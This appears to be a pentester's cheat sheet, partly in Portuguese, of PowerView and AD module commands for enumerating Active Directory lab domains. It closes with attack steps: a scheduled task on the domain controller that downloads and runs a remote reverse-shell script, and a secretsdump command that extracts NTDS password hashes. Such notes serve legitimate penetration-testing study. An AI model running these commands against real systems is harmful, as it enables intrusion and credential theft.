### Mind Map
![pentest_ad.png](02%20Pentest%20Tips/AD_Attack/Attachments/pentest_ad.png)

### PowerView or AD module required

### Check Current Domain
```
Get-NetDomain
Get-ADDomain
```

### Check Object Another Domain
```
Get-NetDomain -Domain moneycorp.local
Get-ADDomain -Identity moneycorp.local
```

### Check SID current Domain
```
Get-DomainSID
(Get-ADDomain).DomainSID
```

### Check Domain Policy
```
Get-DomainPolicy
(Get-DomainPolicy)."System Access"
```

### Check Domain Policy Another Domain
`(Get-DomainPolicy -domain moneycorp.local). “System Access”`

### Check Domain Controller current Domain
```
Get-NetDomainController
Get-ADDomainController
```

### Check Domain Controller Another Domain
```
Get-NetDomainController -Domain moneycorp.local
Get-ADDomainController -DomainName moneycorp.local -Discover
```

### 02%20Pentesters
```
Get-NetUser
Get-NetUser -Username student1
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```

### Check Computers**

```
Get-NetComputer
Get-NetComputer -OperatingSystem Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
Get-ADComputer -Filter *select Name

Get-ADComputer -Filter ‘OperatingSystem like "*Server’ -Properties OperatingSystem | select Name, OperatingSystem

Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_DNSHostName}

Get-ADComputer -Filter * Properties *
```

### Check Groups**

```
Get-NetGroup
Get-NetGroup –Domain <targetdomain>
Get-NetGroup –FullData
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```

### Check USers Domain Admin**

```
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

### Check all Groups local (Necessarie DA)**

`Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups`

### Check Local Admin Access**
`Find-LocalAdminAccess`

### User Enumeration**
`Get-NetUser | select -ExpandProperty samaccountname`

### Computer enumerate**
`$enun_cmputer=Get-NetComputer`

### Enumerate ADM Groups**

```
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Enterprise Admins"
Get-NetGroupMember -GroupName "Enterprise Admins" –Domain moneycorp.local
```

### Checar compartilhamentos**
`Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC`

### Group Enumerate**

```
Get-NetGPOGroup
Get-NetGroupMember -GroupName RDPUsers
```

### Enumerate OUs**
`Get-NetOU`

### Enumerate Specific OU**
`Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}`

### List GPOS**
`Get-NetGPO`

### Enumnerar GPO aplicada OU**

```
(Get-NetOU StudentMachines -FullData).gplink

[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]

```

### Enumerate ACL**
`Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose`

### ACL Domain Admin enumerate**
`Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose`

### Enumerar ACL para todas GPO**
`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`

### Enumerar local onde user ou Group tem permissao**

```

Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match "student13"}

Invoke-ACLScanner -ResolveGUIDs |?{$_.IdentityReferenceName -match "RDPUsers"}
```

### Enumerar Diretorio Bloqueado**
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

### Enumerator computador onde Domain Admin ou grupo possui acesso**

```
Invoke-UserHunter -CheckAccess
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

### Enumerar todos dominios**
`Get-NetForestDomain -Verbose`

### Mapear confiaça com dominio**
`Get-NetDomainTrust`

### Maperar confiança com floresta**
`Get-NetForestDomain -Verbose | Get-NetDomainTrust`

### Enumerar dominios externos**

`Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`

### Identificar dominios confiaveis externo**
`Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`

### Achar local onde domain admin esta logado.**
`Invoke-UserHunter -Stealth`

### Schedule task**

`schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck224" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.13/minireverso.ps1''')'"`

### Execute Task**
`schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "student13"`

### Delete Task**
`schtasks /delete /S dcorp-dc.dollarcorp.moneycorp.local /TN "student13"`

### Extract Hash NTDS**

`/usr/share/doc/python3-impacket/examples/secretsdump.py -system registry/SYSTEM -ntds "Active Directory/ntds.dit" -hashes LMHASH:NTHASH  LOCAL -outputfile  nomearquivoagerar`
